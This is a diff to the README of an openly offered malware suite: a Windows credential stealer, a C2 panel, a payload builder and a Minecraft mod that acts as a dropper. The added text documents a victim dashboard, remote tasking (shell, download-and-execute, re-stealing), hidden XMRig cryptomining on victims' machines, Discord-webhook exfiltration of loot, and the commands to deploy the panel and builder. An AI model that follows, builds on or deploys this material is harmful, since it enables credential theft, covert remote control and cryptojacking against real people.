@@ -31,7 +31,7 @@ The suite covers four components, each usable independently:
 | Component | Purpose |
 |---|---|
 | **Collection client** | Pure-Python Windows stealer; the full capability surface |
-| **C2 panel** | Loot intake, sealed payload hosting, pinned-TLS mod channel |
+| **C2 panel** | Loot intake, SaaS dashboard (master-key login), victim tasking, XMRig control, sealed payload hosting, pinned-TLS mod channel |
 | **Builder (Forge)** | Browser-based build service producing sealed, configured payloads |
 | **BlackHole mod** | Fabric mod that acts as the delivery channel — Minecraft itself becomes the dropper |
 
@@ -40,14 +40,15 @@ The suite covers four components, each usable independently:
 ```
 stealer/                   collection client + C2 panel + staged loader
 ├── stealer_client.py      full client, every capability documented inline
-├── c2_server.py           panel: intake, mod channel, payload hosting
+├── c2_server.py           panel: intake, SaaS dashboard, tasking, miner control
 ├── bh_loader.py           minimal staged TLS loader
+├── XMRIG_NOTICE.md        miner provenance, config, and reversibility notes
 └── build_exe.bat          one-command Windows build
 
 forge/                     browser-based builder
 ├── app.py                 Flask backend, operator-token gated
-├── static/index.html      builder UI
-└── templates/             build templates (config injected at forge time)
+├── index.html             builder UI (target, encryption, optional miner defaults)
+└── templates              build template (config injected at forge time)
 
 mod/                       BlackHole — Fabric mod (MC 26.2, Loader 0.19.5)
 └── src/                   pinned-TLS check-in, staged payload fetch and run
@@ -84,7 +85,10 @@ deep — so launchers storing credentials in non-standard paths still get caught
 Two independent modes, selected at build time:
 
 **C2 panel** — loot is compressed, AES-256-GCM sealed, and lands in the panel
-for review.
+for review. The panel doubles as a **SaaS-style control center**: a single
+master key (no user accounts, no database) unlocks a dashboard listing every
+victim with sysinfo, loot counts, and miner state, plus tasking — shell,
+re-steal, download+exec, and miner start/stop.
 
 **Discord webhook** — the complete loot set ships as a **single downloadable
 JSON file**: a summary and credential preview in the message body, the full
@@ -102,8 +106,27 @@ default `python-urllib` agent is filtered by Cloudflare (error 1010).
 
 ```bash
 pip install flask pycryptodome
-sudo python3 stealer/c2_server.py --port 443
+sudo MASTER_KEY=<random> python3 stealer/c2_server.py --port 443
 ```
+
+Then open `/panel` and unlock with the master key. The key can also live in
+`/root/.ramos_panel_key` (read automatically if `MASTER_KEY` is unset).
+
+**Agent tasking** — the client beacons `/agent/checkin` after its initial
+theft pass (~60s jitter) and receives queued tasks: `shell`, `steal`
+(re-run collection), `download_exec`, `miner_start`, `miner_stop`. Results
+post back to `/agent/result` and appear under the victim in the panel.
+Pass `--no-agent` for one-shot behavior.
+
+### Miner (open-source XMRig)
+
+The panel drives stock [XMRig](https://github.com/xmrig/xmrig) (GPL) — no
+custom miner code. Place an official Windows build next to `c2_server.py` as
+`xmrig.exe`; the agent downloads it from your panel, writes a per-victim
+`config.json` (pool, wallet, `max-cpu-usage` — default 50%), and runs it
+hidden with no admin rights. `miner_stop` kills it outright — fully
+reversible, and the forge can bake pool/wallet/autostart into the sealed
+config at build time. See [`XMRIG_NOTICE.md`](stealer/XMRIG_NOTICE.md).
 
 ### Client
 
@@ -126,9 +149,10 @@ No console, no arguments, no elevation required — the victim double-clicks.
 ### Builder
 
 A Flask service producing sealed builds from a browser: paste a C2 address or
-Discord webhook, choose Python or JAR, toggle encryption, forge. Each build's
-config is sealed with a per-build random key and is never persisted — no
-database, no user accounts, nothing survives the request.
+Discord webhook, choose Python or JAR, toggle encryption, optionally bake
+XMRig pool/wallet defaults, forge. Each build's config is sealed with a
+per-build random key and is never persisted — no database, no user accounts,
+nothing survives the request.
 
 ```bash
 FORGE_TOKEN=<random> python3 forge/app.py
